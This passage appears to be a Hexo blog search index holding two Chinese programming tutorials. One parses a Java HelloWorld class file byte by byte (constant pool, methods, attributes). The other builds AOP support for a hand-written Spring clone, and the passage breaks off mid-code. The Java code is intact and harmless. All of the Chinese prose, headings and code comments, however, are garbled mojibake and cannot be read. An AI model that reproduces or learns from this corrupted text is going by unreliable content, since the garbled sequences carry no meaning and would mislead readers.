<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Javaå­—èŠ‚ç äºŒè¿›åˆ¶è§£æï¼Œçœ‹æ‡‚æ¯ä¸€ä¸ªå­—èŠ‚</title>
    <link href="/2022/08/18/jvm/"/>
    <url>/2022/08/18/jvm/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå­—èŠ‚ç äºŒè¿›åˆ¶è§£æï¼Œçœ‹æ‡‚æ¯ä¸€ä¸ªå­—èŠ‚"><a href="#Javaå­—èŠ‚ç äºŒè¿›åˆ¶è§£æï¼Œçœ‹æ‡‚æ¯ä¸€ä¸ªå­—èŠ‚" class="headerlink" title="Javaå­—èŠ‚ç äºŒè¿›åˆ¶è§£æï¼Œçœ‹æ‡‚æ¯ä¸€ä¸ªå­—èŠ‚"></a>Javaå­—èŠ‚ç äºŒè¿›åˆ¶è§£æï¼Œçœ‹æ‡‚æ¯ä¸€ä¸ªå­—èŠ‚</h1><p>[TOC]</p><h2 id="åŸºç¡€ç¯å¢ƒï¼š"><a href="#åŸºç¡€ç¯å¢ƒï¼š" class="headerlink" title="åŸºç¡€ç¯å¢ƒï¼š"></a>åŸºç¡€ç¯å¢ƒï¼š</h2><ul><li><p>ideaå…ˆå®‰è£…jclasslib(è¿™ä¸ªä¸å¤šè¯´)å’ŒBinEd(è¿™ä¸ªç”¨äºæŸ¥çœ‹å­—èŠ‚ç æ–‡ä»¶çš„äºŒè¿›åˆ¶)</p></li><li><p>ç¤ºèŒƒä»£ç (ä¸€ä¸ªç®€å•çš„HelloWorld)ï¼š</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.demo;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorld</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        System.out.println(<span class="hljs-string">&quot;Hello World!!!&quot;</span>);    &#125;&#125;</code></pre></div></li><li><p>ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ç¼–è¯‘å™¨ç»™æˆ‘ä»¬åŠ äº†ä¸€ä¸ªæ„é€ æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/64791e0f6c604a08912ed65e1b4c7784.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>BinEdæŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/54ab685aee5f4390aa2280ad486f723d.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li></ul><h2 id="æŠ½è±¡è®¤è¯†å­—èŠ‚ç "><a href="#æŠ½è±¡è®¤è¯†å­—èŠ‚ç " class="headerlink" title="æŠ½è±¡è®¤è¯†å­—èŠ‚ç "></a>æŠ½è±¡è®¤è¯†å­—èŠ‚ç </h2><ul><li><p>å…ˆçœ‹ä¸€å¼ å›¾ï¼Œå‰é¢çš„<strong>u</strong>ä»£è¡¨å­—èŠ‚ï¼Œ<strong>u4</strong>å°±æ˜¯4å­—èŠ‚ï¼Œ**!**å°±æ˜¯å­—èŠ‚æ•°æ— æ³•ç¡®å®šï¼ˆè¯·ä»”ç»†çœ‹è¿™å¼ å›¾ï¼‰</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596196309058-44addc71-19a2-4c5a-817e-e113a43053f6.png" alt="image.png"></p></li><li><p>è®©æˆ‘ä»¬å…ˆæ ¹æ®è¿™å¼ å›¾ç‰‡æŠ½è±¡åˆ†æä¸€ä¸‹äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/b2aeee02be1d4f5e9e2652a0cfc4135d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>æˆ‘çŸ¥é“ä½ çš„ç–‘æƒ‘ã€‚ä¸ºä»€ä¹ˆæˆ‘çŸ¥é“<strong>å¸¸é‡æ± </strong>æ˜¯å“ªé‡Œåˆ°å“ªé‡Œï¼Œ<strong>æ–¹æ³•çš„å€¼</strong>æ˜¯å“ªé‡Œåˆ°å“ªé‡Œï¼Œä»¥åŠ<strong>ç±»å±æ€§å€¼</strong>æ˜¯å“ªé‡Œåˆ°å“ªé‡Œï¼Ÿ</p></li><li><p>é¦–å…ˆæ€•æœ‰äº›äººæ²¡çœ‹å‡ºæ¥ï¼Œæˆ‘è¿™ä¸ªç±»å®ç°çš„æ¥å£ä¸ªæ•°å’Œæˆå‘˜æ•°é‡éƒ½æ˜¯0ï¼Œæ‰€ä»¥æ–‡ä»¶äºŒè¿›åˆ¶ä¸­å°±æ²¡æœ‰é—´éš”</p></li></ul><h2 id="ç»†ğŸ”’å¸¸é‡æ± "><a href="#ç»†ğŸ”’å¸¸é‡æ± " class="headerlink" title="ç»†ğŸ”’å¸¸é‡æ± "></a>ç»†ğŸ”’å¸¸é‡æ± </h2><ul><li><p>é¦–å…ˆæˆ‘ä»¬çœ‹å¸¸é‡æ± å¤§å°æ˜¯0x22ä¹Ÿå°±æ˜¯33ï¼Œæˆ‘ä»¬ä½¿ç”¨jclasslibçœ‹ä¸€ä¸‹ç¡®å®æ˜¯33ä¸ª</p><p>![æˆªå±2022-08-17 ä¸‹åˆ9.58.49](&#x2F;Users&#x2F;zhchen&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;æˆªå±2022-08-17 ä¸‹åˆ9.58.49.png)</p></li><li><p>å…ˆè¡¥å……ä¸€ä¸‹å¸¸é‡æ± çš„11ç§ç±»å‹æ•°æ®çš„ç»“æ„ï¼ˆå¾ˆå…³é”®ï¼ï¼ï¼ï¼‰</p><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/2179815/1596801221629-d71bcaab-f2ea-4960-94f0-862dc41e9a25.jpeg?x-oss-process=image/resize,w_1496,limit_0" alt="img"></p></li><li><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®å ä¸€ä¸ªå­—èŠ‚çš„tagçŸ¥é“å®ƒæ˜¯ä»€ä¹ˆç±»å‹çš„å¸¸é‡ï¼Œä¹Ÿå°±ç¡®å®šäº†å­—èŠ‚é•¿åº¦ï¼Œå¯¹ä¸utf8ç±»å‹çš„å¸¸é‡ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®é•¿åº¦å†å¾—åˆ°å…¶å çš„å­—èŠ‚æ•°ï¼Œäºæ˜¯å°±æœ‰ï¼š</p><p><img src="https://img-blog.csdnimg.cn/7349c09de683404e846cde9d59198ba1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li></ul><h2 id="ç»†ğŸ”’æ–¹æ³•å€¼"><a href="#ç»†ğŸ”’æ–¹æ³•å€¼" class="headerlink" title="ç»†ğŸ”’æ–¹æ³•å€¼"></a>ç»†ğŸ”’æ–¹æ³•å€¼</h2><ul><li><p>æ–¹æ³•å€¼çš„ç»„æˆï¼šå¯ä»¥çœ‹åˆ°ä¸€ä¸ªmethod_infoä¸­å«æœ‰access_flags(è®¿é—®æ§åˆ¶æƒé™)ï¼Œname_index(åç§°åœ¨å¸¸é‡æ± çš„index)ï¼Œdescriptor_index(æ–¹æ³•ç­¾å)ï¼Œattribute_info(å±æ€§)</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777954370-968abdf9-27ad-472d-bd16-933d94bcf77c.png" alt="image.png"></p></li><li><p>åœ¨çœ‹attributeçš„ç»„æˆï¼Œatrribute_name_index,attribute_length,infoï¼Œå…¶ä¸­æˆ‘ä»¬çŸ¥é“äº†attribute_lengthä¾¿çŸ¥é“äº†attribute_infoçš„é•¿åº¦</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777962604-6eeb49ab-c166-4303-9cce-52bdf4d50067.png" alt="image.png"></p></li><li><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥å¾—åˆ°</p><p><img src="https://img-blog.csdnimg.cn/2077d6719e2e478188a2860f465febb1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>ç°åœ¨æˆ‘ä»¬åªçœ‹ç¬¬ä¸€ä¸ªæ–¹æ³•</p><p>å®ƒçš„name_indexæ˜¯07ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨jclasslibé‡Œçœ‹ä¸€ä¸‹ç¼–å·ä¸º7çš„å¸¸é‡æ± ï¼Œåˆšå¥½å°±æ˜¯init,ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªæ–¹æ³•çš„åå­—</p><p><img src="https://img-blog.csdnimg.cn/e14fe11a1c0d446e97996e932b409099.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>åŒæ ·æ˜¯ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å†çœ‹å®ƒçš„attributes_countçš„å€¼æ˜¯1ï¼Œè¯´æ˜åªæœ‰ä¸€ä¸ªattribute,å¹¶ä¸”å®ƒçš„attribute_name_indexå€¼æ˜¯09ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å¸¸é‡æ± é‡Œæ‰¾åˆ°9å·å­—ç¬¦ä¸²å¸¸é‡æ˜¯Code</p><p><img src="https://img-blog.csdnimg.cn/afb820a51d1e474a816eb5b1b6d19563.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>jclasslibéªŒè¯initæ–¹æ³•çš„attributeæ—¶Codeï¼ŒåŒæ—¶ä¹ŸéªŒè¯äº†attribute_lengthä¸º0x2Fä¹Ÿå°±æ˜¯å±æ€§é•¿åº¦47</p><p><img src="https://img-blog.csdnimg.cn/6bae94d5a3fa42478dacdabb52659737.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li></ul><h2 id="ç»†ğŸ”’å±æ€§å€¼"><a href="#ç»†ğŸ”’å±æ€§å€¼" class="headerlink" title="ç»†ğŸ”’å±æ€§å€¼"></a>ç»†ğŸ”’å±æ€§å€¼</h2><ul><li>ä¸Šé¢é‚£å¼ å›¾æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒCodeä¸‹é¢åˆæœ‰äºŒä¸ªä¸œè¥¿ï¼ŒLineNumberTableå’ŒLocalVariableTableï¼Œæˆ‘ä»¬å…ˆçœ‹è¿™å‡ å¼ å›¾å°±çŸ¥é“äº†</li><li><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777972245-8cc9b05e-55f6-4f1b-bdb1-11768b6277ab.png" alt="image.png"></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777979315-efee0c3c-5448-47e2-8ff6-141d8bd98ad5.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777986999-851a1a94-1b62-426a-a88b-51e2a4702b43.png" alt="image.png"></p><ul><li><p>çœ‹æ¥ä¸åŒçš„å±æ€§å­˜å‚¨çš„æ–¹å¼ä¹Ÿä¸ä¸€æ ·ï¼Œè€Œä¸”Codeå±æ€§ä¸­è¿˜åŒ…å«LineNumberTableå±æ€§(ä»£ç æ‰€åœ¨è¡Œå·,è¿™å°±å¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæŠ¥é”™èƒ½ç²¾å‡†å®šä½äº†)å’ŒLocalVariableTableå±æ€§(å±€éƒ¨å˜é‡è¡¨)ï¼Œäºæ˜¯</p><p><img src="https://img-blog.csdnimg.cn/5f5cc6f9ffe9420d890d15b9786a72a7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li></ul><h2 id="ç»†è¯´ç±»å±æ€§å€¼"><a href="#ç»†è¯´ç±»å±æ€§å€¼" class="headerlink" title="ç»†è¯´ç±»å±æ€§å€¼"></a>ç»†è¯´ç±»å±æ€§å€¼</h2><ul><li><p>å’Œå‰é¢ç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®attribute_name_indexå‘ç°å®ƒæ˜¯SourceFileï¼Œé‚£ä¹ˆæˆ‘å·²ç»ç»™å‡ºäº†SourceFile_attributeçš„ç»“æ„äº†ï¼Œè§‰å¾—è¯»è€…åº”è¯¥å¯ä»¥è‡ªå·±å°è¯•ä¸‹æ ‡å‡ºæœ€åé‚£ä¸€è¡Œäº†ğŸ˜€</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777993406-7fd9aff9-428d-4884-8ede-12f1d4d08579.png" alt="image.png"></p></li></ul><h2 id="ä¸€äº›è¡¥å……çš„ä¸œè¥¿"><a href="#ä¸€äº›è¡¥å……çš„ä¸œè¥¿" class="headerlink" title="ä¸€äº›è¡¥å……çš„ä¸œè¥¿"></a>ä¸€äº›è¡¥å……çš„ä¸œè¥¿</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777945935-ee37aab0-071e-4e29-9966-c8c4081a143d.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596196744955-bb4f177d-d01f-4628-b568-439010b8b4fa.png?x-oss-process=image/resize,w_1500,limit_0" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596196775123-210bfc49-9e11-4be1-9f91-7a048892015e.png?x-oss-process=image/resize,w_1500,limit_0" alt="image.png"></p><ul><li>ä¸»ç‰ˆæœ¬å·ä¸æ¬¡ç‰ˆæœ¬å·<br><img src="https://img-blog.csdnimg.cn/2bd6dd5a07ea4e9fbe3d9fb73f0f0c51.png" alt="ä¸»ç‰ˆæœ¬å·ä¸æ¬¡ç‰ˆæœ¬å·"></li></ul>]]></content>
    
    
    <categories>
      
      <category>æ‰‹å†™jvm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æš‘å‡æœ€åå‡ å¤©ï¼è‚çˆ†ï¼ˆæ‰‹å†™ï¼‰ä¸€ä¸ªSpringä¹‹Day5</title>
    <link href="/2022/08/17/spring_day05/"/>
    <url>/2022/08/17/spring_day05/</url>
    
    <content type="html"><![CDATA[<h1 id="Day05â€”AOPä»£ç ç»‡å…¥"><a href="#Day05â€”AOPä»£ç ç»‡å…¥" class="headerlink" title="Day05â€”AOPä»£ç ç»‡å…¥"></a>Day05â€”AOPä»£ç ç»‡å…¥</h1><p>[TOC]</p><h2 id="åŸºç¡€é…ç½®"><a href="#åŸºç¡€é…ç½®" class="headerlink" title="åŸºç¡€é…ç½®"></a>åŸºç¡€é…ç½®</h2><ul><li><p>å› ä¸ºä½¿ç”¨propertiesä»£æ›¿äº†xmlï¼Œæ‰€ä»¥åœ¨application.propertiesä¸­åŠ å…¥,ç®€åŒ–æ“ä½œ</p><div class="code-wrapper"><pre><code class="hljs properties"><span class="hljs-comment">#å¤šåˆ‡é¢é…ç½®å¯ä»¥åœ¨keyå‰é¢åŠ å‰ç¼€</span><span class="hljs-comment">#ä¾‹å¦‚ aspect.logAspect.</span><span class="hljs-comment"></span><span class="hljs-comment">#åˆ‡é¢è¡¨è¾¾å¼,expression#</span><span class="hljs-attr">pointCut</span>=<span class="hljs-string">public .* com.czh.spring.demo.service..*ServiceImpl..*(.*)</span><span class="hljs-comment">#åˆ‡é¢ç±»#</span><span class="hljs-attr">aspectClass</span>=<span class="hljs-string">com.czh.spring.demo.aspect.LogAspect</span><span class="hljs-comment">#åˆ‡é¢å‰ç½®é€šçŸ¥#</span><span class="hljs-attr">aspectBefore</span>=<span class="hljs-string">before</span><span class="hljs-comment">#åˆ‡é¢åç½®é€šçŸ¥#</span><span class="hljs-attr">aspectAfter</span>=<span class="hljs-string">after</span><span class="hljs-comment">#åˆ‡é¢å¼‚å¸¸é€šçŸ¥#</span><span class="hljs-attr">aspectAfterThrow</span>=<span class="hljs-string">afterThrowing</span><span class="hljs-comment">#åˆ‡é¢å¼‚å¸¸ç±»å‹#</span><span class="hljs-attr">aspectAfterThrowingName</span>=<span class="hljs-string">java.lang.Exception</span></code></pre></div></li></ul><h2 id="å®ŒæˆAOPé¡¶å±‚è®¾è®¡"><a href="#å®ŒæˆAOPé¡¶å±‚è®¾è®¡" class="headerlink" title="å®ŒæˆAOPé¡¶å±‚è®¾è®¡"></a>å®ŒæˆAOPé¡¶å±‚è®¾è®¡</h2><ul><li><p>JoinPointï¼Œå®šä¹‰ä¸€ä¸ªåˆ‡ç‚¹çš„æŠ½è±¡ï¼Œè¿™æ˜¯AOPçš„åŸºç¡€ç»„æˆå•å…ƒã€‚å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸šåŠ¡æ–¹æ³•çš„é™„åŠ ä¿¡æ¯ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å›è°ƒè¿æ¥ç‚¹ï¼Œé€šè¿‡å®ƒå¯ä»¥è·å¾—è¢«ä»£ç†çš„ä¸šåŠ¡æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyJoinPoint</span> &#123;    Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span>;<span class="hljs-comment">//ä¸šåŠ¡æ–¹æ³•æœ¬èº«</span>    Object[] getArguments();<span class="hljs-comment">//è¯¥æ–¹æ³•çš„å®å‚åˆ—è¡¨</span>    Object <span class="hljs-title function_">getThis</span><span class="hljs-params">()</span>;<span class="hljs-comment">//è¯¥æ–¹æ³•æ‰€å±çš„å®ä¾‹å¯¹è±¡</span>    <span class="hljs-comment">//åœ¨JoinPointä¸­æ·»åŠ è‡ªå®šä¹‰å±æ€§</span>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserAttribute</span><span class="hljs-params">(String key,Object value)</span>;    <span class="hljs-comment">//ä»å·²æ·»åŠ çš„è‡ªå®šä¹‰å±æ€§ä¸­è·å–ä¸€ä¸ªå±æ€§</span>    Object <span class="hljs-title function_">getUserAttribute</span><span class="hljs-params">(String key)</span>;&#125;</code></pre></div></li><li><p>MethodInterceptorï¼Œæ–¹æ³•æ‹¦æˆªå™¨ï¼ŒAOPä»£ç å¢å¼ºçš„åŸºæœ¬ç»„æˆå•å…ƒï¼Œå­ç±»ä¸»è¦æœ‰MethodBeforeAdviceï¼ŒAfterReturningAdviceï¼ŒAfterThrowingAdvice.</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.intercept;<span class="hljs-comment">/**</span><span class="hljs-comment"> * æ–¹æ³•æ‹¦æˆªå™¨é¡¶å±‚æ¥å£</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyMethodInterceptor</span> &#123;    Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(MyMethodInvocation mi)</span><span class="hljs-keyword">throws</span> Throwable;&#125;</code></pre></div></li><li><p>AopConfigï¼Œå®šä¹‰AOPçš„é…ç½®ä¿¡æ¯çš„å°è£…å¯¹è±¡ï¼Œä»¥æ–¹ä¾¿åœ¨ä¹‹åçš„ä»£ç ä¸­ç›¸äº’ä¼ é€’ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.config;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-comment">/**</span><span class="hljs-comment"> * AOPé…ç½®å°è£…</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAopConfig</span> &#123;    <span class="hljs-comment">/*ä¸propertiesæ–‡ä»¶ä¸­çš„å±æ€§ä¸€ä¸€å¯¹åº”*/</span>        <span class="hljs-comment">//åˆ‡é¢è¡¨è¾¾å¼</span>    <span class="hljs-keyword">private</span> String pointCut;    <span class="hljs-comment">//å‰ç½®é€šçŸ¥æ–¹æ³•å</span>    <span class="hljs-keyword">private</span> String aspectBefore;    <span class="hljs-comment">//åç½®é€šçŸ¥æ–¹æ³•å</span>    <span class="hljs-keyword">private</span> String aspectAfter;    <span class="hljs-comment">//è¦æ¤å…¥çš„åˆ‡é¢ç±»</span>    <span class="hljs-keyword">private</span> String aspectClass;    <span class="hljs-comment">//å¼‚å¸¸é€šçŸ¥æ–¹æ³•å</span>    <span class="hljs-keyword">private</span> String aspectAfterThrow;    <span class="hljs-comment">//éœ€è¦é€šçŸ¥çš„å¼‚å¸¸ç±»å‹</span>    <span class="hljs-keyword">private</span> String aspectAfterThrowingName;&#125;</code></pre></div></li><li><p>AdvisedSupportï¼Œä¸»è¦å®Œæˆå¯¹AOPé…ç½®çš„è§£æã€‚å…¶ä¸­PointCutMatch()æ–¹æ³•ç”¨æ¥åˆ¤æ–­ç›®æ ‡ç±»æ˜¯å¦ç¬¦åˆåˆ‡é¢è§„åˆ™ï¼Œä»è€Œå†³å®šæ˜¯å¦ç”Ÿæˆä»£ç†ç±»ï¼Œå¯¹ç›®æ ‡æ–¹æ³•è¿›è¡Œå¢å¼ºã€‚getInterceptorAndDynamicInterceptionAdvice()åˆ™ä¸»è¦æ ¹æ®AOPé…ç½®ï¼Œå°†éœ€è¦å›è°ƒçš„æ–¹æ³•å°è£…æˆä¸€ä¸ªæ‹¦æˆªå™¨é“¾å¹¶è¿”å›æä¾›ç»™å¤–éƒ¨è·å–ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.support;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.config.MyAopConfig;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.LinkedList;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.regex.Matcher;<span class="hljs-keyword">import</span> java.util.regex.Pattern;<span class="hljs-comment">/**</span><span class="hljs-comment"> * ä¸»è¦ç”¨æ¥è§£æå’Œå°è£…AOPé…ç½®</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdvisedSupport</span> &#123;    <span class="hljs-keyword">private</span> Class targetClass;    <span class="hljs-keyword">private</span> Object target;    <span class="hljs-keyword">private</span> Pattern pointCutClassPattern;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Map&lt;Method, List&lt;Object&gt;&gt; methodCache;    <span class="hljs-keyword">private</span> MyAopConfig aopConfig;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAdvisedSupport</span><span class="hljs-params">(MyAopConfig aopConfig)</span> &#123;        <span class="hljs-built_in">this</span>.aopConfig = aopConfig;    &#125;    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">getTargetClass</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> targetClass;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTargetClass</span><span class="hljs-params">(Class targetClass)</span> &#123;        <span class="hljs-built_in">this</span>.targetClass = targetClass;        parse();    &#125;    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getTarget</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> target;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;        <span class="hljs-built_in">this</span>.target = target;    &#125;      <span class="hljs-keyword">public</span> List&lt;Object&gt; <span class="hljs-title function_">getInterceptorAndDynamicInterceptionAdvice</span><span class="hljs-params">(Method method,Class&lt;?&gt; targetClass)</span><span class="hljs-keyword">throws</span> Exception&#123;        List&lt;Object&gt; cached = methodCache.get(method);                <span class="hljs-comment">//ç¼“å­˜æœªå‘½ä¸­ï¼Œåˆ™è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†</span>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == cached)&#123;            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> targetClass.getMethod(method.getName(), method.getParameterTypes());            cached = methodCache.get(m);            <span class="hljs-comment">//å­˜å…¥ç¼“å­˜</span>            <span class="hljs-built_in">this</span>.methodCache.put(m,cached);        &#125;        <span class="hljs-keyword">return</span> cached;    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">pointCutMatch</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> pointCutClassPattern.matcher(<span class="hljs-built_in">this</span>.targetClass.toString()).matches();    &#125;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parse</span><span class="hljs-params">()</span>&#123;        <span class="hljs-comment">//pointCutè¡¨è¾¾å¼</span>        <span class="hljs-type">String</span> <span class="hljs-variable">pointCut</span> <span class="hljs-operator">=</span> aopConfig.getPointCut()                .replaceAll(<span class="hljs-string">&quot;\\.&quot;</span>,<span class="hljs-string">&quot;\\\\.&quot;</span>)                .replaceAll(<span class="hljs-string">&quot;\\\\.\\*&quot;</span>,<span class="hljs-string">&quot;.*&quot;</span>)                .replaceAll(<span class="hljs-string">&quot;\\(&quot;</span>,<span class="hljs-string">&quot;\\\\(&quot;</span>)                .replaceAll(<span class="hljs-string">&quot;\\)&quot;</span>,<span class="hljs-string">&quot;\\\\)&quot;</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">pointCutForClass</span> <span class="hljs-operator">=</span> pointCut.substring(<span class="hljs-number">0</span>, pointCut.lastIndexOf(<span class="hljs-string">&quot;\\(&quot;</span>) - <span class="hljs-number">4</span>);        pointCutClassPattern = Pattern.compile(<span class="hljs-string">&quot;class &quot;</span> + pointCutForClass.substring(pointCutForClass.lastIndexOf(<span class="hljs-string">&quot; &quot;</span>) + <span class="hljs-number">1</span>));                methodCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Method,List&lt;Object&gt;&gt;();        <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(pointCut);        <span class="hljs-keyword">try</span> &#123;            Class&lt;?&gt; aspectClass = Class.forName(aopConfig.getAspectClass());            HashMap&lt;String, Method&gt; aspectMethods = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();            <span class="hljs-keyword">for</span> (Method m : aspectClass.getMethods()) &#123;                aspectMethods.put(m.getName(),m);            &#125;                        <span class="hljs-comment">//åœ¨è¿™é‡Œå¾—åˆ°çš„éƒ½æ˜¯åŸç”Ÿæ–¹æ³•</span>            <span class="hljs-keyword">for</span> (Method m : targetClass.getMethods()) &#123;                <span class="hljs-type">String</span> <span class="hljs-variable">methodString</span> <span class="hljs-operator">=</span> m.toString();                <span class="hljs-keyword">if</span>(methodString.contains(<span class="hljs-string">&quot;throw&quot;</span>))&#123;                    methodString = methodString.substring(<span class="hljs-number">0</span>,methodString.lastIndexOf(<span class="hljs-string">&quot;throws&quot;</span>)).trim();                &#125;                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(methodString);                <span class="hljs-keyword">if</span>(matcher.matches())&#123;                    <span class="hljs-comment">//èƒ½å¤Ÿæ»¡è¶³åˆ‡é¢è§„åˆ™çš„ç±»,æ·»åŠ åˆ°AOPé…ç½®ä¸­</span>                    LinkedList&lt;Object&gt; advices = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();                    <span class="hljs-comment">//å‰ç½®é€šçŸ¥</span>                    <span class="hljs-keyword">if</span>(!(<span class="hljs-literal">null</span> == aopConfig.getAspectBefore() || <span class="hljs-string">&quot;&quot;</span>.equals(aopConfig.getAspectBefore().trim())))&#123;                        advices.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyMethodBeforeAdvice</span>(aspectMethods.get(aopConfig.getAspectBefore()),aspectClass.newInstance()));                    &#125;                    <span class="hljs-comment">//åç½®é€šçŸ¥</span>                    <span class="hljs-keyword">if</span>(!(<span class="hljs-literal">null</span> == aopConfig.getAspectAfter() || <span class="hljs-string">&quot;&quot;</span>.equals(aopConfig.getAspectAfter().trim())))&#123;                        advices.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAfterReturningAdvice</span>(aspectMethods.get(aopConfig.getAspectAfter()),aspectClass.newInstance()));                    &#125;                    <span class="hljs-comment">//å¼‚å¸¸é€šçŸ¥</span>                    <span class="hljs-keyword">if</span>(!(<span class="hljs-literal">null</span> == aopConfig.getAspectAfterThrow() || <span class="hljs-string">&quot;&quot;</span>.equals(aopConfig.getAspectAfterThrow().trim())))&#123;                        <span class="hljs-type">MyAfterThrowingAdvice</span> <span class="hljs-variable">afterThrowingAdvice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAfterThrowingAdvice</span>(aspectMethods.get(aopConfig.getAspectAfterThrow()), aspectClass.newInstance());                        afterThrowingAdvice.setThrowingName(aopConfig.getAspectAfterThrowingName());                        advices.add(afterThrowingAdvice);                    &#125;                    methodCache.put(m,advices);                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;    